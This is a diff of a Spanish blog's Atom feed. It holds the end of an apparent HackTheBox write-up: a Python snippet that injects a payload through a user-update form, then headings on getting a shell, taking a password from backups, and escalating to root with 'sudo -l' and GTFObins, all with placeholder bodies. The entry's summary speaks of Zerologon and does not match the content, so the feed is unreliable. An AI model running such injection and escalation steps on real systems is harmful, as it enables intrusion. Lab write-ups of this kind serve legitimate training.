+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user[username]'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'commit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Update User'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/users/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/users/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/articles'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;inyecctando-la-shell-en-el-servidor&quot;&gt;Inyecctando la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt; en el servidor&lt;/h2&gt;
+&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;
+
+&lt;h2 id=&quot;conseguir-la-shell-desde-el-servidor&quot;&gt;Conseguir la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shell&lt;/code&gt; desde el servidor&lt;/h2&gt;
+&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;
+
+&lt;h2 id=&quot;conseguir-el-password-de-la-cuenta-de-bill-en-los-backups-del-servidor&quot;&gt;Conseguir el password de la cuenta de bill en los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backups del servidor&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;
+
+&lt;h2 id=&quot;obtener-el-codigo-de-google-authenticator&quot;&gt;Obtener el codigo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Google Authenticator&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;
+
+&lt;h2 id=&quot;usando-el-comando-sudo--l&quot;&gt;Usando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/h2&gt;
+&lt;p&gt;xxxxxxxxxxxxxxx&lt;/p&gt;
+
+&lt;h2 id=&quot;con-la-ayuda-de-gtfo-bins-obtenemos-el-roottxt&quot;&gt;Con la ayuda de GTFO bins obtenemos el root.txt&lt;/h2&gt;
+&lt;p&gt;xxxxxxxxxxxxxxxc&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Utilidades" /><category term="Exploits" /><category term="Vulnerabilidades" /><category term="HackTheBox" /><category term="Pentesting" /><category term="Herramientas" /><category term="Windows" /><category term="Linux" /><category term="Domain Controller" /><category term="Guías" /><category term="Privilege Escalation" /><summary type="html">Mucho se está hablando acerca de la nueva vulnerabilidad Zerologon, pero... ¿realmente es crítica?. Lo analizaremos en detalle en este artículo.</summary></entry><entry><title type="html">Cómo construir tu propio sistema Linux</title><link href="http://localhost:4000/como-crear-un-sistema-linux/" rel="alternate" type="text/html" title="Cómo construir tu propio sistema Linux" /><published>2020-04-23T00:00:00+02:00</published><updated>2020-04-23T00:00:00+02:00</updated><id>http://localhost:4000/como-crear-un-sistema-linux</id><content type="html" xml:base="http://localhost:4000/como-crear-un-sistema-linux/">&lt;h1 id=&quot;cómo-construir-tu-propio-sistema-linux-s4vios&quot;&gt;Cómo construir tu propio sistema Linux (S4viOS)&lt;/h1&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://wallpaperaccess.com/full/981849.png&quot; alt=&quot;Portada OS&quot; /&gt;&lt;/p&gt;
 
